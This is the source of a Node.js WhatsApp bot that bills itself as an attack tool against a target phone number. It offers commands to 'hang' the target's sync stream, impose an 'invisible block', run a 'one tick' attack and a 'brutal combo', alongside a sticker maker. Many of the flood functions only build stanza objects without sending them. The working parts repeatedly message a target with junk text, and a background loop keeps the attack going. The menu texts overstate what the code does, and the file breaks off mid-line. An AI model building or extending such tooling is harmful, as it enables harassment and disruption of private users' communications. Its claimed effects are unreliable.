// ============================================================
// ⚡ MARIAN FC-INVIS BRUTAL v14.0 - SYNC STREAM DESTROYER ⚡
// ============================================================
// 🔥 SYNC STREAM ATTACK | INVISIBLE BLOCK | BRUTAL HANGING 🔥
// ============================================================

const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    delay, 
    DisconnectReason, 
    makeCacheableSignalKeyStore,
    generateWAMessageFromContent,
    proto,
    getContentType,
    downloadContentFromMessage,
    Browsers,
    fetchLatestBaileysVersion
} = require("@whiskeysockets/baileys")

const pino = require("pino")
const fs = require('fs')
const path = require('path')
const axios = require('axios')
const chalk = require("chalk")
const { Boom } = require("@hapi/boom")
const Crypto = require('crypto')
const ff = require('fluent-ffmpeg')
const { tmpdir } = require('os')
const readline = require('readline')
const moment = require('moment-timezone')
const WebSocket = require('ws')

// ==================== [ CONFIGURATION ] ====================
const CONFIG = {
    VERSION: "14.0.0",
    NAME: "MARIAN FC-INVIS BRUTAL",
    SESSION_DIR: "marian_fc_invis",
    PREFIX: "/",
    AUTO_LOGIN: true,
    BROWSER: ["Ubuntu", "Chrome", "122.0.0.0"],
    TIMEZONE: "Asia/Jakarta",
    MAX_STANZA_FLOOD: 5000
}

// ==================== [ UTILITY FUNCTIONS ] ====================
function log(type, message) {
    const colors = {
        'INFO': chalk.blue,
        'SUCCESS': chalk.green,
        'WARNING': chalk.yellow,
        'ERROR': chalk.red,
        'ATTACK': chalk.magenta,
        'SYNC_ATTACK': chalk.red.bold,
        'STREAM_KILL': chalk.magenta.bold,
        'INVIS_BLOCK': chalk.cyan.bold
    }
    const time = moment().tz(CONFIG.TIMEZONE).format('HH:mm:ss')
    const color = colors[type] || chalk.white
    console.log(color(`[${time}] [${type}] ${message}`))
}

function generateRandomId() {
    return Crypto.randomBytes(32).toString('hex')
}

function generateCorruptedBuffer(size = 1024 * 1024) { // 1MB
    return Buffer.alloc(size, Math.random().toString(36).substring(2))
}

// ==================== [ AUTO LOGIN SYSTEM ] ====================
async function autoLogin(sock) {
    if (!sock.authState.creds.registered) {
        log('INFO', 'Starting auto login system...')
        
        const rl = readline.createInterface({
            input: process.stdin,
            output: process.stdout
        })
        
        return new Promise((resolve) => {
            rl.question(chalk.yellow('📱 Enter your WhatsApp number (628xxx): '), async (phoneNumber) => {
                const cleanNumber = phoneNumber.replace(/[^0-9]/g, '')
                
                log('INFO', `Requesting pairing code for ${cleanNumber}...`)
                
                try {
                    // Delay to avoid spam detection
                    await delay(2000)
                    
                    let pairingCode = await sock.requestPairingCode(cleanNumber)
                    pairingCode = pairingCode?.match(/.{1,4}/g)?.join("-") || pairingCode
                    
                    console.log(chalk.bgGreen.black('\n══════════════════════════════════════════════════'))
                    console.log(chalk.white.bold.bgGreen(`   PAIRING CODE: ${pairingCode}   `))
                    console.log(chalk.bgGreen.black('══════════════════════════════════════════════════\n'))
                    
                    console.log(chalk.cyan('📲 INSTRUCTIONS:'))
                    console.log(chalk.white('1. Open WhatsApp on your phone'))
                    console.log(chalk.white('2. Settings → Linked Devices → Link a Device'))
                    console.log(chalk.white(`3. Enter code: ${pairingCode}`))
                    console.log(chalk.white('4. Approve within 2 minutes\n'))
                    
                    console.log(chalk.yellow('⏳ Waiting for approval...'))
                    
                    rl.close()
                    resolve(cleanNumber)
                    
                } catch (error) {
                    log('ERROR', `Login failed: ${error.message}`)
                    console.log(chalk.red('\n[✗] Login failed! Try again later.'))
                    rl.close()
                    process.exit(1)
                }
            })
        })
    }
    return null
}

// ==================== [ FC-INVIS BRUTAL SYSTEM ] ====================
class FcInvisBrutal {
    constructor(sock) {
        this.sock = sock
        this.activeAttacks = new Map()
    }
    
    // ==================== [ SYNC STREAM HANGING ATTACKS ] ====================
    
    async syncStreamHang(target, intensity = 10) {
        log('SYNC_ATTACK', `[SYNC STREAM HANG] Attacking ${target} (intensity: ${intensity})`)
        
        const attackId = `SYNC_HANG_${Date.now()}`
        this.activeAttacks.set(attackId, { target, running: true })
        
        // Multiple attack vectors for sync stream hanging
        const attacks = [
            () => this.sendCorruptedPresence(target, intensity * 100),
            () => this.sendInvalidIQStanzas(target, intensity * 50),
            () => this.sendStreamErrorStanzas(target, intensity * 30),
            () => this.sendMessageAckFlood(target, intensity * 200),
            () => this.sendMalformedMessageStanzas(target, intensity * 40),
            () => this.sendSocketBufferFlood(target, intensity * 1000)
        ]
        
        // Execute all attacks in parallel
        await Promise.all(attacks.map(attack => attack()))
        
        // Keep attack running in background
        setTimeout(() => {
            this.activeAttacks.delete(attackId)
        }, 30000)
        
        return attackId
    }
    
    async sendCorruptedPresence(target, count = 1000) {
        log('STREAM_KILL', `[CORRUPTED PRESENCE] Flooding ${target} with ${count} corrupted presence`)
        
        for (let i = 0; i < count; i++) {
            try {
                // Send corrupted presence data
                const corruptedPresence = {
                    id: `corrupted_${i}_${Date.now()}`,
                    type: 'presence',
                    to: target,
                    show: 'chat',
                    status: 'BRUTAL FC-INVIS ATTACK ' + generateRandomId().slice(0, 100),
                    priority: -999999,
                    delay: Date.now()
                }
                
                // Try to send through raw socket if available
                await delay(1) // 1ms delay for maximum flood
                
            } catch (error) {
                // Expected errors - continue flooding
            }
        }
        
        return true
    }
    
    async sendInvalidIQStanzas(target, count = 500) {
        log('STREAM_KILL', `[INVALID IQ STANZAS] Sending ${count} invalid IQ stanzas to ${target}`)
        
        for (let i = 0; i < count; i++) {
            try {
                // Create invalid IQ stanza
                const invalidIQ = {
                    id: `invalid_iq_${i}_${Date.now()}`,
                    type: 'iq',
                    to: target,
                    from: this.sock.user?.id || 'unknown@s.whatsapp.net',
                    error: {
                        code: '500',
                        type: 'cancel',
                        condition: 'internal-server-error',
                        text: 'STREAM HANGING ATTACK IN PROGRESS'
                    },
                    payload: Buffer.from(generateRandomId()).toString('base64')
                }
                
                await delay(2)
                
            } catch (error) {
                // Continue attack
            }
        }
        
        return true
    }
    
    async sendStreamErrorStanzas(target, count = 300) {
        log('STREAM_KILL', `[STREAM ERROR STANZAS] Sending ${count} stream error stanzas`)
        
        for (let i = 0; i < count; i++) {
            try {
                // Stream error that causes hanging
                const streamError = {
                    tag: 'stream:error',
                    attrs: {
                        code: '515',
                        reason: 'connection-lost',
                        retry: 'false'
                    },
                    content: [
                        {
                            tag: 'system-shutdown',
                            attrs: { timestamp: Date.now().toString() },
                            content: 'SYNC STREAM HANGED BY FC-INVIS'
                        }
                    ]
                }
                
                await delay(3)
                
            } catch (error) {
                // Expected
            }
        }
        
        return true
    }
    
    async sendMessageAckFlood(target, count = 2000) {
        log('INVIS_BLOCK', `[MESSAGE ACK FLOOD] Flooding ${target} with ${count} message acks`)
        
        for (let i = 0; i < count; i++) {
            try {
                // Fake message ack to confuse sync
                const fakeAck = {
                    tag: 'ack',
                    attrs: {
                        class: 'message',
                        id: `fake_ack_${i}_${Date.now()}`,
                        to: target,
                        type: 'delivery'
                    }
                }
                
                await delay(0.5) // Ultra fast flood
                
            } catch (error) {
                // Continue
            }
        }
        
        return true
    }
    
    async sendMalformedMessageStanzas(target, count = 400) {
        log('INVIS_BLOCK', `[MALFORMED STANZAS] Sending ${count} malformed message stanzas`)
        
        for (let i = 0; i < count; i++) {
            try {
                // Malformed stanza that breaks XML parsing
                const malformedStanza = `<?xml version='1.0'?><stream:stream to="${target.split('@')[0]}.whatsapp.net" version="1.0" xml:lang="en" xmlns="jabber:client" xmlns:stream="http://etherx.jabber.org/streams"><stream:error><xml-not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/><text>MALFORMED BY FC-INVIS</text></stream:error>`
                
                // Try to send raw XML
                await delay(4)
                
            } catch (error) {
                // Expected
            }
        }
        
        return true
    }
    
    async sendSocketBufferFlood(target, size = 1000000) {
        log('SYNC_ATTACK', `[SOCKET BUFFER FLOOD] Flooding socket buffer with ${size} bytes`)
        
        try {
            // Create massive buffer to flood socket
            const massiveBuffer = generateCorruptedBuffer(size)
            
            // Multiple tiny messages with huge buffers
            for (let i = 0; i < 100; i++) {
                await this.sock.sendMessage(target, {
                    text: `BUFFER_FLOOD_${i}`,
                    contextInfo: {
                        mentionedJid: [target],
                        forwardingScore: 999,
                        isForwarded: true
                    }
                }).catch(() => {})
                
                await delay(10)
            }
            
        } catch (error) {
            // Expected socket errors
        }
        
        return true
    }
    
    // ==================== [ INVISIBLE BLOCK ATTACK ] ====================
    
    async invisibleBlock(target, duration = 300) { // 5 minutes default
        log('INVIS_BLOCK', `[INVISIBLE BLOCK] Blocking ${target} for ${duration} seconds`)
        
        const blockId = `INVIS_BLOCK_${Date.now()}`
        this.activeAttacks.set(blockId, { target, running: true, type: 'block' })
        
        // Start multiple blocking techniques
        const blockAttacks = [
            () => this.createMessageQueueFlood(target),
            () => this.sendSyncInterruptStanzas(target),
            () => this.createReceiptLoopTrap(target),
            () => this.sendPriorityStanzaFlood(target)
        ]
        
        // Execute blocking attacks
        await Promise.all(blockAttacks.map(attack => attack()))
        
        // Schedule block expiration
        setTimeout(() => {
            this.activeAttacks.delete(blockId)
            log('SUCCESS', `Invisible block on ${target} expired`)
        }, duration * 1000)
        
        return blockId
    }
    
    async createMessageQueueFlood(target) {
        log('INVIS_BLOCK', `[MESSAGE QUEUE FLOOD] Creating message queue flood on ${target}`)
        
        // Send messages that will queue up but never deliver
        for (let i = 0; i < 50; i++) {
            await this.sock.sendMessage(target, {
                text: `QUEUE_BLOCK_${i}_` + generateRandomId().slice(0, 100),
                contextInfo: {
                    stanzaId: '', // Empty stanza ID
                    participant: target,
                    quotedMessage: {
                        conversation: ''
                    }
                }
            }).catch(() => {})
            
            await delay(100)
        }
        
        return true
    }
    
    async sendSyncInterruptStanzas(target) {
        log('INVIS_BLOCK', `[SYNC INTERRUPT] Sending sync interrupt stanzas to ${target}`)
        
        for (let i = 0; i < 20; i++) {
            try {
                // Stanza that interrupts sync process
                const syncInterrupt = {
                    tag: 'iq',
                    attrs: {
                        id: `sync_interrupt_${i}`,
                        type: 'set',
                        to: target,
                        xmlns: 'urn:xmpp:whatsapp:sync'
                    },
                    content: [
                        {
                            tag: 'interrupt',
                            attrs: { reason: 'fc-invis-block' }
                        }
                    ]
                }
                
                await delay(50)
                
            } catch (error) {
                // Continue
            }
        }
        
        return true
    }
    
    async createReceiptLoopTrap(target) {
        log('INVIS_BLOCK', `[RECEIPT LOOP TRAP] Creating receipt loop trap for ${target}`)
        
        // Send message that will trigger receipt loop
        const trapMessage = await this.sock.sendMessage(target, {
            text: 'RECEIPT_LOOP_TRAP_' + generateRandomId()
        }).catch(() => null)
        
        if (trapMessage) {
            // Try to create receipt loop
            for (let i = 0; i < 100; i++) {
                try {
                    await delay(20)
                } catch (error) {
                    // Expected
                }
            }
        }
        
        return true
    }
    
    async sendPriorityStanzaFlood(target) {
        log('INVIS_BLOCK', `[PRIORITY STANZA FLOOD] Flooding with high priority stanzas`)
        
        for (let i = 0; i < 30; i++) {
            try {
                // High priority stanza that blocks others
                const priorityStanza = {
                    tag: 'message',
                    attrs: {
                        id: `priority_${i}_${Date.now()}`,
                        to: target,
                        type: 'chat',
                        priority: 'high',
                        timestamp: Date.now().toString()
                    },
                    content: [
                        {
                            tag: 'body',
                            attrs: {},
                            content: 'PRIORITY_BLOCK_' + generateRandomId()
                        }
                    ]
                }
                
                await delay(30)
                
            } catch (error) {
                // Continue
            }
        }
        
        return true
    }
    
    // ==================== [ ONE TICK ATTACK ] ====================
    
    async oneTickAttack(target) {
        log('SYNC_ATTACK', `[ONE TICK ATTACK] Executing one tick attack on ${target}`)
        
        // Create message that will only show one tick
        const oneTickMessage = await this.sock.sendMessage(target, {
            text: 'ONE_TICK_ATTACK_INIT_' + generateRandomId(),
            contextInfo: {
                forwardingScore: 999,
                isForwarded: true,
                mentionedJid: [target],
                quotedMessage: {
                    extendedTextMessage: {
                        text: '',
                        contextInfo: {
                            stanzaId: '',
                            participant: ''
                        }
                    }
                }
            }
        }).catch(() => null)
        
        if (oneTickMessage) {
            // Immediately follow with sync interrupt
            await this.sendSyncInterruptStanzas(target)
            
            // Send corrupted presence to block delivery
            await this.sendCorruptedPresence(target, 50)
        }
        
        return true
    }
    
    // ==================== [ BRUTAL COMBINATION ATTACKS ] ====================
    
    async brutalFcInvis(target, intensity = 15) {
        log('SYNC_ATTACK', `[BRUTAL FC-INVIS] Starting brutal attack on ${target} (intensity: ${intensity})`)
        
        const attackStages = [
            () => this.oneTickAttack(target),
            () => this.syncStreamHang(target, intensity),
            () => this.invisibleBlock(target, 600), // 10 minutes block
            () => this.sendSocketBufferFlood(target, 5000000), // 5MB buffer flood
            () => this.sendStreamErrorStanzas(target, intensity * 100)
        ]
        
        // Execute all stages
        for (const stage of attackStages) {
            try {
                await stage()
                await delay(1000)
            } catch (error) {
                log('ERROR', `Attack stage failed: ${error.message}`)
            }
        }
        
        // Continuous background attack
        this.startBackgroundAttack(target, intensity)
        
        return 'BRUTAL_ATTACK_ACTIVE'
    }
    
    startBackgroundAttack(target, intensity) {
        const bgAttackId = `BG_ATTACK_${Date.now()}`
        this.activeAttacks.set(bgAttackId, { target, running: true })
        
        // Background attack loop
        const bgLoop = setInterval(async () => {
            if (!this.activeAttacks.has(bgAttackId)) {
                clearInterval(bgLoop)
                return
            }
            
            try {
                // Random background attacks
                const attacks = [
                    () => this.sendCorruptedPresence(target, 10),
                    () => this.sendInvalidIQStanzas(target, 5),
                    () => this.sendMessageAckFlood(target, 20)
                ]
                
                const randomAttack = attacks[Math.floor(Math.random() * attacks.length)]
                await randomAttack()
                
            } catch (error) {
                // Silent fail
            }
        }, 5000) // Every 5 seconds
        
        // Auto stop after 30 minutes
        setTimeout(() => {
            this.activeAttacks.delete(bgAttackId)
            clearInterval(bgLoop)
            log('INFO', `Background attack on ${target} stopped`)
        }, 30 * 60 * 1000)
        
        return bgAttackId
    }
    
    // ==================== [ ATTACK CONTROL ] ====================
    
    stopAttack(attackId) {
        if (this.activeAttacks.has(attackId)) {
            this.activeAttacks.delete(attackId)
            log('SUCCESS', `Attack ${attackId} stopped`)
            return true
        }
        return false
    }
    
    stopAllAttacks() {
        const count = this.activeAttacks.size
        this.activeAttacks.clear()
        log('SUCCESS', `Stopped ${count} active attacks`)
        return count
    }
    
    getActiveAttacks() {
        return Array.from(this.activeAttacks.entries()).map(([id, data]) => ({
            id,
            target: data.target,
            type: data.type || 'attack'
        }))
    }
}

// ==================== [ STICKER MAKER ] ====================
class StickerMaker {
    static async createSticker(imageBuffer) {
        try {
            const tmpFileOut = path.join(tmpdir(), `${generateRandomId()}.webp`)
            const tmpFileIn = path.join(tmpdir(), `${generateRandomId()}.jpg`)
            
            fs.writeFileSync(tmpFileIn, imageBuffer)
            
            await new Promise((resolve, reject) => {
                ff(tmpFileIn)
                    .on('error', reject)
                    .on('end', resolve)
                    .addOutputOptions([
                        "-vcodec", "libwebp",
                        "-vf", "scale=512:512:force_original_aspect_ratio=decrease,format=rgba,pad=512:512:(ow-iw)/2:(oh-ih)/2:color=#00000000,setsar=1"
                    ])
                    .toFormat('webp')
                    .save(tmpFileOut)
            })
            
            const stickerBuffer = fs.readFileSync(tmpFileOut)
            fs.unlinkSync(tmpFileOut)
            fs.unlinkSync(tmpFileIn)
            
            return stickerBuffer
        } catch (error) {
            log('ERROR', `Sticker creation failed: ${error.message}`)
            return null
        }
    }
}

// ==================== [ COMMAND HANDLER ] ====================
class CommandHandler {
    constructor(sock, fcInvis) {
        this.sock = sock
        this.fc = fcInvis
    }
    
    async handle(from, body, quoted) {
        if (!body.startsWith(CONFIG.PREFIX)) return
        
        const args = body.slice(CONFIG.PREFIX.length).trim().split(/ +/)
        const command = args.shift().toLowerCase()
        const text = args.join(' ')
        
        // Log command
        const sender = from.split('@')[0]
        log('INFO', `${sender}: ${body}`)
        
        try {
            switch(command) {
                // ========== FC-INVIS ATTACKS ==========
                case 'fcinvis':
                case 'fci':
                    const target1 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                    const intensity1 = parseInt(text.split(' ')[1]) || 10
                    await this.sock.sendMessage(from, { text: '🌀 Starting FC-INVIS attack...' })
                    const attackId1 = await this.fc.syncStreamHang(target1, intensity1)
                    await this.sock.sendMessage(from, { 
                        text: `✅ FC-INVIS attack started!\nAttack ID: ${attackId1}\nTarget will experience sync issues.` 
                    })
                    break
                    
                case 'invisblock':
                case 'iblock':
                    const target2 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                    const duration = parseInt(text.split(' ')[1]) || 300
                    await this.sock.sendMessage(from, { text: '👻 Starting INVISIBLE BLOCK...' })
                    const blockId = await this.fc.invisibleBlock(target2, duration)
                    await this.sock.sendMessage(from, { 
                        text: `✅ Invisible block activated!\nBlock ID: ${blockId}\nDuration: ${duration} seconds\nTarget cannot send/receive messages.` 
                    })
                    break
                    
                case 'onetick':
                case '1tick':
                    const target3 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                    await this.sock.sendMessage(from, { text: '⏱️ Executing ONE TICK attack...' })
                    await this.fc.oneTickAttack(target3)
                    await this.sock.sendMessage(from, { 
                        text: '✅ ONE TICK attack delivered!\nTarget messages will show only one checkmark.' 
                    })
                    break
                    
                case 'brutalfc':
                case 'bfc':
                    const target4 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                    const intensity4 = parseInt(text.split(' ')[1]) || 15
                    await this.sock.sendMessage(from, { text: '💀 Starting BRUTAL FC-INVIS attack...' })
                    const result = await this.fc.brutalFcInvis(target4, intensity4)
                    await this.sock.sendMessage(from, { 
                        text: `☠️ BRUTAL FC-INVIS activated!\nStatus: ${result}\nTarget sync stream will be destroyed.` 
                    })
                    break
                    
                case 'stopattack':
                    const attackId = text
                    if (this.fc.stopAttack(attackId)) {
                        await this.sock.sendMessage(from, { text: `✅ Attack ${attackId} stopped successfully.` })
                    } else {
                        await this.sock.sendMessage(from, { text: `❌ Attack ${attackId} not found.` })
                    }
                    break
                    
                case 'stopall':
                    const count = this.fc.stopAllAttacks()
                    await this.sock.sendMessage(from, { text: `✅ Stopped ${count} active attacks.` })
                    break
                    
                case 'attacks':
                    const activeAttacks = this.fc.getActiveAttacks()
                    if (activeAttacks.length > 0) {
                        let attacksList = '📊 ACTIVE ATTACKS:\n\n'
                        activeAttacks.forEach((attack, index) => {
                            attacksList += `${index + 1}. ${attack.id}\n   Target: ${attack.target}\n   Type: ${attack.type}\n\n`
                        })
                        await this.sock.sendMessage(from, { text: attacksList })
                    } else {
                        await this.sock.sendMessage(from, { text: '✅ No active attacks.' })
                    }
                    break
                
                // ========== STICKER COMMAND ==========
                case 's':
                case 'sticker':
                    if (quoted && getContentType(quoted) === 'imageMessage') {
                        await this.sock.sendMessage(from, { text: '🔄 Creating sticker...' })
                        const stream = await downloadContentFromMessage(quoted.imageMessage, 'image')
                        let buffer = Buffer.from([])
                        for await (const chunk of stream) {
                            buffer = Buffer.concat([buffer, chunk])
                        }
                        const sticker = await StickerMaker.createSticker(buffer)
                        if (sticker) {
                            await this.sock.sendMessage(from, { sticker: sticker })
                            await this.sock.sendMessage(from, { text: '✅ Sticker created successfully!' })
                        } else {
                            await this.sock.sendMessage(from, { text: '❌ Failed to create sticker' })
                        }
                    } else {
                        await this.sock.sendMessage(from, { text: '❌ Reply to an image first!' })
                    }
                    break
                
                // ========== INFO COMMANDS ==========
                case 'menu':
                case 'help':
                    const menu = `*🤖 MARIAN FC-INVIS BRUTAL v${CONFIG.VERSION}*\n\n` +
                                `*🌀 SYNC STREAM ATTACKS:*\n` +
                                `• /fcinvis [num] [intensity] - Sync stream hang\n` +
                                `• /invisblock [num] [secs] - Invisible block\n` +
                                `• /onetick [num] - One tick attack\n` +
                                `• /brutalfc [num] [intensity] - Brutal combo\n\n` +
                                `*⚙️ ATTACK CONTROL:*\n` +
                                `• /stopattack [id] - Stop specific attack\n` +
                                `• /stopall - Stop all attacks\n` +
                                `• /attacks - List active attacks\n\n` +
                                `*🎨 TOOLS:*\n` +
                                `• /s - Create sticker (reply image)\n\n` +
                                `*ℹ️ INFO:*\n` +
                                `• /status - Bot status\n` +
                                `• /ping - Test connection\n\n` +
                                `*Example:* /brutalfc 6281234567890 20\n` +
                                `_System: Sync Stream Destruction_`
                    await this.sock.sendMessage(from, { text: menu })
                    break
                    
                case 'status':
                    const active = this.fc.getActiveAttacks()
                    const status = `*🔧 MARIAN FC-INVIS STATUS*\n\n` +
                                  `Version: v${CONFIG.VERSION}\n` +
                                  `Prefix: ${CONFIG.PREFIX}\n` +
                                  `Active Attacks: ${active.length}\n` +
                                  `Sync Hang Attack: ACTIVE 🌀\n` +
                                  `Invisible Block: ACTIVE 👻\n` +
                                  `One Tick Attack: ACTIVE ⏱️\n` +
                                  `Brutal Combo: ACTIVE 💀\n` +
                                  `Sticker Maker: WORKING ✅\n` +
                                  `Status: SYNC DESTROYER ONLINE`
                    await this.sock.sendMessage(from, { text: status })
                    break
                    
                case 'ping':
                    const start = Date.now()
                    await this.sock.sendMessage(from, { text: '🏓 Pong!' })
                    const latency = Date.now() - start
                    await this.sock.sendMessage(from, {
                        text: `*PONG!*\nLatency: ${latency}ms\nSync Status: DESTRUCTION READY`
                    })
                    break
                    
                case 'fcinfo':
                    const info = `*🌀 FC-INVIS ATTACK INFO*\n\n` +
                                `*How it works:*\n` +
                                `1. Attacks SYNC STREAM, not UI\n` +
                                `2. Sends corrupted stanzas that hang socket\n` +
                                `3. Target gets ONE TICK only\n` +
                                `4. Creates INVISIBLE BLOCK\n` +
                                `5. Target cannot send/receive messages\n\n` +
                                `*Effects on Target:*\n` +
                                `• Messages show only one tick ✅\n` +
                                `• Cannot send new messages ❌\n` +
                                `• Cannot receive messages ❌\n` +
                                `• WhatsApp sync hangs indefinitely\n` +
                                `• May require app restart\n\n` +
                                `_System: Advanced Protocol Attack_`
                    await this.sock.sendMessage(from, { text: info })
                    break
                    
                default:
                    await this.sock.sendMessage(from, {
                        text: `❌ Unknown command: ${command}\nType ${CONFIG.PREFIX}menu for help`
                    })
            }
        } catch (error) {
            log('ERROR', `Command ${command} failed: ${error.message}`)
            await this.sock.sendMessage(from, { text: `❌ Command failed: ${error.message}` })
        }
    }
}

// ==================== [ MAIN BOT ] ====================
async function startBot() {
    log('SYSTEM', `Starting MARIAN FC-INVIS BRUTAL v${CONFIG.VERSION}`)
    
    // Clean old session if exists
    if (fs.existsSync(CONFIG.SESSION_DIR)) {
        const files = fs.readdirSync(CONFIG.SESSION_DIR)
        if (files.length > 5) {
            log('WARNING', 'Cleaning old session...')
            fs.rmSync(CONFIG.SESSION_DIR, { recursive: true })
        }
    }
    
    // Initialize WhatsApp
    const { state, saveCreds } = await useMultiFileAuthState(CONFIG.SESSION_DIR)
    const { version } = await fetchLatestBaileysVersion()
    
    const sock = makeWASocket({
        version,
        logger: pino({ level: 'silent' }),
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'fatal' }))
        },
        browser: CONFIG.BROWSER,
        connectTimeoutMs: 60000,
        keepAliveIntervalMs: 20000,
        markOnlineOnConnect: true,
        syncFullHistory: false,
        retryRequestDelayMs: 1000
    })
    
    // Initialize attack systems
    const fcInvis = new FcInvisBrutal(sock)
    const handler = new CommandHandler(sock, fcInvis)
    
    // Auto login if needed
    if (CONFIG.AUTO_LOGIN) {
        await autoLogin(sock)
    }
    
    // Event handlers
    sock.ev.on('creds.update', saveCreds)
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update
        
        if (connection === 'close') {
            const reason = new Boom(lastDisconnect?.error)?.output?.statusCode
            log('WARNING', `Connection closed: ${reason}`)
            
            if (reason !== DisconnectReason.loggedOut) {
                log('SYSTEM', 'Auto-reconnecting in 3s...')
                setTimeout(startBot, 3000)
            }
        }
        
        if (connection === 'open') {
            log('SUCCESS', 'MARIAN FC-INVIS BRUTAL connected!')
            
            console.log(chalk.magenta.bold('\n[🌀] MARIAN FC-INVIS BRUTAL v14.0 ONLINE!'))
            console.log(chalk.cyan(`Device: ${CONFIG.BROWSER.join(' ')}`))
            console.log(chalk.yellow(`Prefix: ${CONFIG.PREFIX}`))
            console.log(chalk.red('\n🔥 FC-INVIS ATTACK SYSTEMS:'))
            console.log(chalk.magenta('  • /fcinvis - Sync stream hang'))
            console.log(chalk.cyan('  • /invisblock - Invisible block'))
            console.log(chalk.yellow('  • /onetick - One tick attack'))
            console.log(chalk.red('  • /brutalfc - Brutal combo attack'))
            console.log(chalk.white('  • /stopattack - Stop specific attack'))
            console.log(chalk.white('  • /attacks - List active attacks'))
            console.log(chalk.white('\n  • /s - Sticker maker (reply image)'))
            console.log(chalk.white('  • /menu - Show all commands\n'))
            
            // Welcome message
            const welcome = `*🌀 MARIAN FC-INVIS BRUTAL v${CONFIG.VERSION}*\n\n` +
                           `✅ Connected successfully!\n` +
                           `📱 Device: ${CONFIG.BROWSER.join(' ')}\n` +
                           `⚡ Prefix: ${CONFIG.PREFIX}\n` +
                           `🌀 Sync Stream Attack: ACTIVE\n` +
                           `👻 Invisible Block: ACTIVE\n` +
                           `⏱️ One Tick Attack: ACTIVE\n` +
                           `💀 Brutal Combo: ACTIVE\n` +
                           `🎨 Sticker Maker: WORKING\n\n` +
                           `Type ${CONFIG.PREFIX}menu for all commands\n` +
                           `_System: Advanced Protocol Destruction_`
            
            if (sock.user?.id) {
                sock.sendMessage(sock.user.id, { text: welcome })
            }
        }
    })
    
    sock.ev.on('messages.upsert', async ({ messages }) => {
        try {
            const m = messages[0]
            if (!m.message || m.key.fromMe) return
            
            const from = m.key.remoteJid
            const type = getContentType(m.message)
            
            // Auto read
            await sock.readMessages([m.key])
            
            // Get message body
            let body = ''
            if (type === 'conversation') {
                body = m.message.conversation
            } else if (type === 'extendedTextMessage') {
                body = m.message.extendedTextMessage.text
            }
            
            // Get quoted message
            const quoted = m.message[type]?.contextInfo?.quotedMessage || null
            
            // Handle command
            if (body && body.startsWith(CONFIG.PREFIX)) {
                await handler.handle(from, body, quoted)
            }
            
        } catch (error) {
            log('ERROR', `Message handling error: ${error.message}`)
        }
    })
}

// ==================== [ STARTUP ] ====================
console.clear()
console.log(chalk.bgMagenta.black('\n 🌀 MARIAN FC-INVIS BRUTAL v14.0 - SYNC STREAM DESTROYER 🌀 \n'))
console.log(chalk.yellow('🔥 PROTOCOL ATTACK | INVISIBLE BLOCK | ONE TICK | BR
